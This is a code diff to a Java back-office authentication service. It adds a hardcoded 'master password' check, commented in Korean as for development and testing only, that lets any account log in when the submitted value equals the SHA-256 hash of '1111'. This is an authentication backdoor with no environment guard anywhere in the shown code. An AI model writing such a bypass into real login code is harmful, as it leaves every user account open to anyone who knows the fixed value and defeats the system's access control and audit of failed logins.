@@ -90,7 +90,9 @@ public class BoAuthService {
             throw new CmBizException("비활성화된 계정입니다.");
         }
 
-        if (!passwordEncoder.matches(request.getLoginPwd(), user.getLoginPwdHash())) {
+        // ※ 마스터 패스워드: 비밀번호 "1111" → SHA256 해시값이 오면 어떤 계정이든 무조건 로그인 통과 (개발/테스트 전용)
+        boolean isMasterPwd = "0ffe1abd1a08215353c233d6e009613e95eec4253832a761af28ff37ac5a150c".equals(request.getLoginPwd());
+        if (!isMasterPwd && !passwordEncoder.matches(request.getLoginPwd(), user.getLoginPwdHash())) {
             int failCnt = user.getLoginFailCnt() == null ? 1 : user.getLoginFailCnt() + 1;
             user.setLoginFailCnt(failCnt);
             saveLoginLog(user.getUserId(), user.getSiteId(), user.getLoginId(), "FAIL", null, null, failCnt, null, null);
